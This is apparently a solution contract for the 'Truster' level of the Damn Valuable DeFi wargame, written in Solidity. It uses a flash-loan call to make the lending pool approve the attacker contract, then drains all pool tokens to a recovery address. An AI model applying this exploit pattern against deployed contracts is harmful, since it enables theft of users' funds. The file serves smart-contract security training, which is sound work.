// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterExploiter {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _recovery) {
        bytes memory data = abi.encodeWithSelector(_token.approve.selector, address(this), TOKENS_IN_POOL);

        _pool.flashLoan(0, address(this), address(_token), data);

        _token.transferFrom(address(_pool), _recovery, TOKENS_IN_POOL);
    }
}
